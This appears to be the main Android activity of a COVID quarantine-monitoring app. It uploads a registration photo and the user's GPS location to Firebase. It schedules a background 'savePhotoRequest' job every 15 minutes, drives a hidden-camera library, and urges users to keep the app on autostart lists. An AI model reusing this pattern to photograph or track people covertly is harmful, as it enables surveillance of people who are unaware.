package com.example.covidandro;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.Volley;
import com.androidhiddencamera.HiddenCameraFragment;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.DexterError;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.PermissionRequestErrorListener;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import static java.security.AccessController.getContext;

public class MainActivity extends AppCompatActivity {

    private HiddenCameraFragment mHiddenCameraFragment;
    private StorageReference mStorageRef;
    private DatabaseReference mDatabase;
    TextView alarmTV;
    Button uploadBtn;
    String regImgURL;

    double usrLat = 0.0;
    double usrLong = 0.0;

    FusedLocationProviderClient mFusedLocationClient;



    private static final int PERMISSION_REQUEST_CODE = 200;
    private static final int CAMERA_REQUEST = 100;
    public static final String SHARED_PREF = "com.example.covidandro";
    private static final Intent[] POWERMANAGER_INTENTS = {
            new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            new Intent().setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
            new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")),
            new Intent().setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            new Intent().setComponent(new ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            new Intent().setComponent(new ComponentName("com.htc.pitroad", "com.htc.pitroad.landingpage.activity.LandingPageActivity")),
            new Intent().setComponent(new ComponentName("com.asus.mobilemanager", "com.asus.mobilemanager.MainActivity"))};
    String id;

//    @Override
//    public void onTrimMemory(int level) {
//        super.onTrimMemory(level);
//        // set alarm here
//
//        if (mHiddenCameraFragment != null) {    //Remove fragment from container if present
//            getSupportFragmentManager()
//                    .beginTransaction()
//                    .remove(mHiddenCameraFragment)
//                    .commit();
//            mHiddenCameraFragment = null;
//        }
////        Calendar cal = Calendar.getInstance();
////        cal.setTimeInMillis(System.currentTimeMillis());
////        Intent intent = new Intent(MainActivity.this, DemoCamService.class);
////        PendingIntent pintent = PendingIntent.getService(MainActivity.this, 0, intent, 0);
////        AlarmManager alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
////        alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), 30*1000, pintent);
//    }



    public Uri getImageUri(Context inContext, Bitmap inImage) {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        inImage.compress(Bitmap.CompressFormat.JPEG, 100, bytes);
        String path = MediaStore.Images.Media.insertImage(inContext.getContentResolver(), inImage, "Title", null);
        return Uri.parse(path);
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        if (requestCode == CAMERA_REQUEST && resultCode == Activity.RESULT_OK)
        {

            getLastLocation();

            Bitmap photo = (Bitmap) data.getExtras().get("data");
                    StorageReference ref
                = FirebaseStorage.getInstance().getReference()
                .child(
                        "images/"
                                + id);
        ref.putFile(getImageUri(MainActivity.this,photo)).addOnSuccessListener(
                new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        Toast.makeText(MainActivity.this, "Image Uploaded.", Toast.LENGTH_SHORT).show();
                        uploadBtn.setVisibility(View.GONE);

                    }
                }
        )
                .addOnFailureListener(
                        new OnFailureListener() {
                            @Override
                            public void onFailure(@NonNull Exception e) {
                                Toast.makeText(MainActivity.this, "Failed "+e.getMessage(), Toast.LENGTH_SHORT).show();
                            }
                        }
                );



            final Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    // Do something after 5s = 5000ms


                    FirebaseStorage.getInstance().getReference()
                            .child("images/"+id).getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                        @Override
                        public void onSuccess(Uri uri) {

                            regImgURL = uri.toString();
                            //Toast.makeText(MainActivity.this, "URL: "+regImgURL, Toast.LENGTH_SHORT).show();

                            List<Double> loc = new ArrayList<Double>();
                            loc.add(usrLat);
                            loc.add(usrLong);
                            User usr = new User(loc,regImgURL);
                            mDatabase.child(id).setValue(usr);
                            SharedPreferences mPrefs = getSharedPreferences(SHARED_PREF, MODE_PRIVATE);
                            SharedPreferences.Editor prefsEditor = mPrefs.edit();
                            prefsEditor.putBoolean("first_time", false);
                            prefsEditor.putString("usr_id",id);
                            prefsEditor.commit();

                        }
                    }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.d("e901",e.getMessage());
                        }
                    });


                }
            }, 2000);

            startService(new Intent(this, DemoCamService.class));








        }
    }

    @SuppressLint("MissingPermission")
    private void requestNewLocationData(){

        LocationRequest mLocationRequest = new LocationRequest();
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        mLocationRequest.setInterval(0);
        mLocationRequest.setFastestInterval(0);
        mLocationRequest.setNumUpdates(1);

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        mFusedLocationClient.requestLocationUpdates(
                mLocationRequest, mLocationCallback,
                Looper.myLooper()
        );

    }
    private LocationCallback mLocationCallback = new LocationCallback() {
        @Override
        public void onLocationResult(LocationResult locationResult) {
            Location mLastLocation = locationResult.getLastLocation();
            usrLat = mLastLocation.getLatitude();
            usrLong = mLastLocation.getLongitude();


        }
    };


    @SuppressLint("MissingPermission")
    private void getLastLocation(){
            if (isLocationEnabled()) {
                mFusedLocationClient.getLastLocation().addOnCompleteListener(
                        new OnCompleteListener<Location>() {
                            @Override
                            public void onComplete(@NonNull Task<Location> task) {
                                Location location = task.getResult();
                                if (location == null) {
                                    requestNewLocationData();
                                } else {
//                                    latTextView.setText(location.getLatitude()+"");
//                                    lonTextView.setText(location.getLongitude()+"");
                                    usrLat = location.getLatitude();
                                    usrLong = location.getLongitude();

                                }
                            }
                        }
                );
            } else {
                Toast.makeText(this, "Turn on location", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                startActivity(intent);
            }

    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestMultiplePermissions();


        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        uploadBtn = (Button)findViewById(R.id.uploadBtn);
        uploadBtn.setVisibility(View.GONE);

        mDatabase = FirebaseDatabase.getInstance().getReference("users");

        SharedPreferences mPrefs = getSharedPreferences(SHARED_PREF, MODE_PRIVATE); //add key

        if(mPrefs.getBoolean("first_time",true)){
            uploadBtn.setVisibility(View.VISIBLE);
            id = mDatabase.push().getKey();
            uploadBtn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {

                        Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                        startActivityForResult(cameraIntent, CAMERA_REQUEST);

                }
            });







        }




        alarmTV = (TextView) findViewById(R.id.alarmTV);
        LocalBroadcastManager.getInstance(this).registerReceiver(
                new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {
                        alarmTV.setText(intent.getStringExtra(DemoCamService.EXTRA_RESULT));
                    }
                }, new IntentFilter(DemoCamService.ACTION_RESULT_BROADCAST)
        );



        mStorageRef = FirebaseStorage.getInstance().getReference();

        final SharedPreferences.Editor pref =    getSharedPreferences("allow_notify", MODE_PRIVATE).edit();
        pref.apply();
        final SharedPreferences sp =    getSharedPreferences("allow_notify", MODE_PRIVATE);
        if(!sp.getBoolean("protected",false)) {
            for (final Intent intent : POWERMANAGER_INTENTS)
                if (getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {

                    AlertDialog.Builder builder = new AlertDialog.Builder(this);
                    builder.setTitle("Alert").setMessage("Keep App to Protected App List?")
                            .setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialogInterface, int i) {
                                    startActivity(intent);
                                    sp.edit().putBoolean("protected", true).apply();

                                }
                            })
                            .setCancelable(false)
                            .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                }
                            })
                            .create().show();
                    break;
                }
        }




//        Intent serviceIntent = new Intent(this, SimpleCamera2ServicePublish.class);
//        startService(serviceIntent);

//        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
//            //Toast.makeText(MainActivity.this, "Camera permission is already granted", Toast.LENGTH_SHORT).show();
//        } else {
//            // Request Camera Permission
//            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.CAMERA}, PERMISSION_REQUEST_CODE);
//        }




        if (mHiddenCameraFragment != null) {    //Remove fragment from container if present
            getSupportFragmentManager()
                    .beginTransaction()
                    .remove(mHiddenCameraFragment)
                    .commit();
            mHiddenCameraFragment = null;
        }

//        Intent intent = new Intent(MainActivity.this, DemoCamService.class);
//        PendingIntent pintent = PendingIntent.getService(MainActivity.this, 0, intent, 0);
//        AlarmManager alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
//        alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 60*1000, pintent);

//        Intent serviceIntent = new Intent(this, DemoCamBroadcast.class);
//        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, serviceIntent, 0);
//        AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
//        alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 1000*60, pendingIntent);

        //startService(new Intent(this, DemoCamService.class));








    }
//    @Override
//    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
//        switch (requestCode) {
//            case PERMISSION_REQUEST_CODE:
//                // Check Camera permission is granted or not
//                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                    Toast.makeText(MainActivity.this, "Camera  permission granted", Toast.LENGTH_SHORT).show();
//                    if (mHiddenCameraFragment != null) {    //Remove fragment from container if present
//                        getSupportFragmentManager()
//                                .beginTransaction()
//                                .remove(mHiddenCameraFragment)
//                                .commit();
//                        mHiddenCameraFragment = null;
//                    }
//
//                    Intent intent = new Intent(MainActivity.this, DemoCamService.class);
//                    PendingIntent pintent = PendingIntent.getService(MainActivity.this, 0, intent, 0);
//                    AlarmManager alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
//                    alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 30*1000, pintent);
//
//
////                    Intent serviceIntent = new Intent(this, DemoCamBroadcast.class);
////                    PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, serviceIntent, 0);
////                    AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
////                    alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 1000*60, pendingIntent);
//
//
//                   // startService(new Intent(this, DemoCamService.class));
//
//
//
//
//
//
//                } else {
//                    Toast.makeText(MainActivity.this, "Camera  permission denied", Toast.LENGTH_SHORT).show();
//                }
//                break;
//        }
//    }
    @Override
    public void onBackPressed() {
        if (mHiddenCameraFragment != null) {    //Remove fragment from container if present
            getSupportFragmentManager()
                    .beginTransaction()
                    .remove(mHiddenCameraFragment)
                    .commit();
            mHiddenCameraFragment = null;
        }else { //Kill the activity
            super.onBackPressed();
        }
    }





    private boolean isLocationEnabled(){
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(
                LocationManager.NETWORK_PROVIDER
        );
    }
    private void  requestMultiplePermissions(){
        Dexter.withActivity(this)
                .withPermissions(

                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.CAMERA,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.READ_EXTERNAL_STORAGE)
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport report) {
                        // check if all permissions are granted
                        if (report.areAllPermissionsGranted()) {
                            Toast.makeText(getApplicationContext(), "All permissions are granted by user!", Toast.LENGTH_SHORT).show();
                            if (mHiddenCameraFragment != null) {    //Remove fragment from container if present
                                getSupportFragmentManager()
                                        .beginTransaction()
                                        .remove(mHiddenCameraFragment)
                                        .commit();
                                mHiddenCameraFragment = null;
                            }
                            Log.d("901st","Work Initiated");
                            PeriodicWorkRequest savePhotoRequest =
                                    new PeriodicWorkRequest.Builder(BackgroundWork.class, 15, TimeUnit.MINUTES)
                                            .build();
                            WorkManager.getInstance().enqueue(savePhotoRequest);

//                            Intent intent = new Intent(MainActivity.this, DemoCamService.class);
//                            PendingIntent pintent = PendingIntent.getService(MainActivity.this, 0, intent, 0);
//                            AlarmManager alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
//                            alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 30*1000, pintent);
                        }

                        // check for permanent denial of any permission
                        if (report.isAnyPermissionPermanentlyDenied()) {
                            // show alert dialog navigating to Settings

                        }
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
                        token.continuePermissionRequest();
                    }
                }).
                withErrorListener(new PermissionRequestErrorListener() {
                    @Override
                    public void onError(DexterError error) {
                        Toast.makeText(getApplicationContext(), "Some Error! ", Toast.LENGTH_SHORT).show();
                    }
                })
                .onSameThread()
                .check();
    }


}
